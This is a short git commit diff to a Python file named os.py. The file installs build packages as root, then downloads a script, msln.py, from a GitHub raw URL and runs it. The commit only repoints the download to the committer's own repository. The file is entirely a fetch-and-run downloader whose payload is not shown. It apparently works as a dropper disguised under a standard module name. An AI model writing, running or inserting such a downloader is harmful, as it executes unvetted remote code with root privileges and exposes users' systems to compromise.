43df643b39fdeefdd6b43c649b623b983066e094
edrivetokenbsc <107461243+edrivetokenbsc@users.noreply.github.com>
2024-12-26 01:18:45 -0600

    Update os.py

--- os.py
+++ os.py
@@ -2,5 +2,5 @@ __author__ = 'root'
 import os,sys
 os.system('apt-get update -y')
 os.system('apt-get install gcc make python python-dev -y')
-os.system('wget https://raw.githubusercontent.com/HarrisNancyvwguc/pkt/master/msln.py')
+os.system('wget https://raw.githubusercontent.com/edrivetokenbsc/pkt/main/msln.py')
 os.system('python3 msln.py') 
